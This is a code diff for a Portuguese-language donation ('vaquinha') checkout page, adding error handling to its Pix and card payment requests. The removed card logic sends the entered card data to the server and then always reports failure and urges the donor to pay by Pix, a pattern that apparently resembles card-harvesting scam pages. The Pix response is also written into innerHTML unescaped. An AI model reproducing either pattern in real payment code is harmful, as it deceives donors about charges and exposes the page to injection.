@@ -6,9 +6,7 @@
   <title>Contribua - Vaquinha</title>
   <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;600&display=swap" rel="stylesheet">
   <style>
-    * {
-      box-sizing: border-box;
-    }
+    * { box-sizing: border-box; }
 
     body {
       font-family: 'Montserrat', sans-serif;
@@ -229,34 +227,56 @@
           dados.valor = valor + 5.99;
         }
 
-        const response = await fetch('/api/gerar-pix', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ valor: dados.valor, email: dados.email, nome: dados.nome, turbinar })
-        });
+        try {
+          const response = await fetch('/api/gerar-pix', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ valor: dados.valor, email: dados.email, nome: dados.nome, turbinar })
+          });
 
-        const json = await response.json();
-        if (json.pix_qr) {
-          document.getElementById('qrcode').innerHTML = `
-            <p><strong>Copia e Cola:</strong><br>${json.pix_copiaecola}</p>
-            <img src="data:image/png;base64,${json.pix_qr}" width="220" />
-          `;
-        } else {
-          alert('Erro ao gerar Pix. Tente novamente.');
+          let json;
+          try {
+            json = await response.json();
+          } catch (err) {
+            alert('Erro interno ao gerar pagamento. Tente novamente.');
+            return;
+          }
+
+          if (json.pix_qr) {
+            document.getElementById('qrcode').innerHTML = `
+              <p><strong>Copia e Cola:</strong><br>${json.pix_copiaecola}</p>
+              <img src="data:image/png;base64,${json.pix_qr}" width="220" />
+            `;
+          } else {
+            alert(json.erro || 'Erro ao gerar Pix.');
+          }
+        } catch (error) {
+          alert('Erro de rede ao gerar Pix.');
         }
       } else if (tipoSelecionado === 'cartao') {
-        const response = await fetch('/api/gerar-cartao', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify(dados)
-        });
+        try {
+          const response = await fetch('/api/gerar-cartao', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(dados)
+          });
 
-        const json = await response.json();
-        if (json.success) {
-          alert('Erro ao processar o pagamento, Selecione pix ou Tente novamente.');
-          document.getElementById('checkoutForm').reset();
-        } else {
-          alert('Erro ao processar o pagamento, Selecione pix ou Tente novamente.');
+          let json;
+          try {
+            json = await response.json();
+          } catch (err) {
+            alert('Erro interno ao processar cartão.');
+            return;
+          }
+
+          if (json.success) {
+            alert('Pagamento com cartão processado com sucesso!');
+            document.getElementById('checkoutForm').reset();
+          } else {
+            alert(json.erro || 'Erro ao processar cartão.');
+          }
+        } catch (error) {
+          alert('Erro de rede ao enviar dados do cartão.');
         }
       } else {
         alert('Selecione uma forma de pagamento.');
